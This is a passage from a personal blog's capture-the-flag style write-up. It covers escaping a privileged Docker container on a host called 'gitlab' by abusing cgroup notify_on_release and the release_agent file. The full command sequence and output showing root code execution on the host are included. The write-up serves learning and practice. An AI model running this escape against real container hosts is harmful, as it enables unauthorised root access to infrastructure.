<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Searching Signature verification failed in dmseg 
<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> https://book.hacktricks.xyz/linux-unix/privilege-escalation   

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> AppArmor enabled? .............. AppArmor Not Found
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> grsecurity present? ............ grsecurity Not Found
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PaX bins present? .............. PaX Not Found
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Execshield enabled? ............ Execshield Not Found 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SELinux enabled? ............... sestatus Not Found
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Is ASLR enabled? ............... Yes
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Printer? ....................... lpstat Not Found
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Is this a virtual machine? ..... Yes <span style="color:#f92672">(</span>docker<span style="color:#f92672">)</span> 
═════════════════════════════════════════╣ Containers ╠══════════════════════════════════════════ 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Is this a container? ........... docker   
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Container related tools present 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Any running containers? ........ No                     
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Am I inside Docker group ....... No
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Looking and enumerating Docker Sockets
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Docker version ................. Not Found
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Vulnerable to CVE-2019-5736 .... Not Found 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Vulnerable to CVE-2019-13139 ... Not Found
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Rooless Docker? ................ No            
</code></pre></div><p><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/</a></p>
<p>I saw from running linpeas.sh earlier on there was cap_chown highlighted as 99% a privliege escalation factor so i looked at it straight away but needed root privileges. I also saw some things realted about escaping docker containers so i thought we are probably going to have to escape this container and kept it in mind for later.</p>
<p>Some enumeration on the capabilities of the dicker container can be performed with some simple linux commands. One that stuck out which was mentioned in the article was cap_sys_admin.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@gitlab:~# find / -name docker.sock 2&gt;/dev/null
find / -name docker.sock 2&gt;/dev/null 

root@gitlab:~# capsh --print
capsh --print

Current: <span style="color:#f92672">=</span> cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,
cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease
,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+eip

Bounding set <span style="color:#f92672">=</span>cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_r
aw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_le
ase,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37

Securebits: 00/0x0/1<span style="color:#960050;background-color:#1e0010">&#39;</span>b0

secure-noroot: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>

secure-no-suid-fixup: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>
 
secure-keep-caps: no <span style="color:#f92672">(</span>unlocked<span style="color:#f92672">)</span>

uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root               
gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>             
groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>  
</code></pre></div><p>Basically here i am running through what the article talked about.  A brief overview of what is happening is to do with c. groups.</p>
<p>cgroups are used in docker containers to isolate themselves, however, there is a feature within c groups that can be abused called notify_on_release. So when the last task within a cgroup leaves (by exiting ot attaching to another cgroup), a command is supplied and executed with full privileges on the host. This command is executed from the &ldquo;release agent&rdquo; file, if we can put a command in this file then we can escape out of the container.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@gitlab:~# mkdir /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mkdir /tmp/cgrp/x 
mkdir /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mount -t cgroup -o rdma cgroup /tmp/cgrp <span style="color:#f92672">&amp;&amp;</span> mkdir /tmp/cgrp/x 

root@gitlab:~# echo <span style="color:#ae81ff">1</span> &gt; /tmp/cgrp/x/notify_on_release       
echo <span style="color:#ae81ff">1</span> &gt; /tmp/cgrp/x/notify_on_release  

root@gitlab:~# host_path<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span> 
host_path<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>sed -n <span style="color:#e6db74">&#39;s/.*\perdir=\([^,]*\).*/\1/p&#39;</span> /etc/mtab<span style="color:#e6db74">`</span>

root@gitlab:~# echo <span style="color:#e6db74">&#34;</span>$host_path<span style="color:#e6db74">/cmd&#34;</span> &gt; /tmp/cgrp/release_agent
echo <span style="color:#e6db74">&#34;</span>$host_path<span style="color:#e6db74">/cmd&#34;</span> &gt; /tmp/cgrp/release_agent

root@gitlab:~# echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd
echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd 

root@gitlab:~# echo <span style="color:#e6db74">&#34;ps aux &gt; </span>$host_path<span style="color:#e6db74">/output&#34;</span> &gt;&gt; /cmd
echo <span style="color:#e6db74">&#34;ps aux &gt; </span>$host_path<span style="color:#e6db74">/output&#34;</span> &gt;&gt; /cmd

root@gitlab:~# chmod a+x /cmd
chmod a+x /cmd

root@gitlab:~# sh -c <span style="color:#e6db74">&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>
sh -c <span style="color:#e6db74">&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>

root@gitlab:~# cat /tmp/cgrp/release_agent
cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/72682da51e1ec80c609bc446d141ff5afed2037d1bdf2810550ecff7fb552e68/diff/cmd

root@gitlab:~# head /output
head /output
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           <span style="color:#ae81ff">1</span>  0.0  0.1 <span style="color:#ae81ff">167716</span>  <span style="color:#ae81ff">7728</span> ?        Ss   04:20   0:08 /sbin/init maybe-ubiquity
root           <span style="color:#ae81ff">2</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    04:20   0:00 <span style="color:#f92672">[</span>kthreadd<span style="color:#f92672">]</span>
root           <span style="color:#ae81ff">3</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   04:20   0:00 <span style="color:#f92672">[</span>rcu_gp<span style="color:#f92672">]</span>
root           <span style="color:#ae81ff">4</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   04:20   0:00 <span style="color:#f92672">[</span>rcu_par_gp<span style="color:#f92672">]</span>
root           <span style="color:#ae81ff">6</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   04:20   0:00 <span style="color:#f92672">[</span>kworker/0:0H-kblockd<span style="color:#f92672">]</span>
root           <span style="color:#ae81ff">9</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I&lt;   04:20   0:00 <span style="color:#f92672">[</span>mm_percpu_wq<span style="color:#f92672">]</span>
root          <span style="color:#ae81ff">10</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    04:20   0:01 <span style="color:#f92672">[</span>ksoftirqd/0<span style="color:#f92672">]</span>
root          <span style="color:#ae81ff">11</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        I    04:20   0:34 <span style="color:#f92672">[</span>rcu_sched<span style="color:#f92672">]</span>
root          <span style="color:#ae81ff">12</span>  0.0  0.0      <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span> ?        S    04:20   0:00 <span style="color:#f92672">[</span>migration/0<span style="color:#f92672">]</span>


root@gitlab:~# echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd
echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd

root@gitlab:~# echo <span style="color:#e6db74">&#34;id &gt; </span>$host_path<span style="color:#e6db74">/output&#34;</span> &gt;&gt; /cmd
echo <span style="color:#e6db74">&#34;id &gt; </span>$host_path<span style="color:#e6db74">/output&#34;</span> &gt;&gt; /cmd

root@gitlab:~# sh -c <span style="color:#e6db74">&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>
sh -c <span style="color:#e6db74">&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>

root@gitlab:~# head /output
head /output

uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>

</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@gitlab:~# echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd
echo <span style="color:#e6db74">&#39;#!/bin/sh&#39;</span> &gt; /cmd

root@gitlab:~# echo <span style="color:#e6db74">&#34;uname -a &gt; </span>$host_path<span style="color:#e6db74">/output&#34;</span> &gt;&gt; /cmd
echo <span style="color:#e6db74">&#34;uname -a &gt; </span>$host_path<span style="color:#e6db74">/output&#34;</span> &gt;&gt; /cmd

root@gitlab:~# sh -c <span style="color:#e6db74">&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>
sh -c <span style="color:#e6db74">&#34;echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs&#34;</span>

root@gitlab:~# head /output
head /output

Linux ready 5.4.0-40-generic <span style="color:#75715e">#44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>

root@gitlab:~# uname -a
uname -a
Linux gitlab.example.com 5.4.0-40-generic <span style="color:#75715e">#44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
root@gitlab:~# 

</code></pre></div><p>We have escaped the docker container,although we do not have a root shell on the host machine we are able to get code execution with root privileges as can be seen through the running of <code>uname -a</code>,  <code>ps -aux</code>, and <code>id</code>.</p>

      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>





  
</div>

</body>
</html>
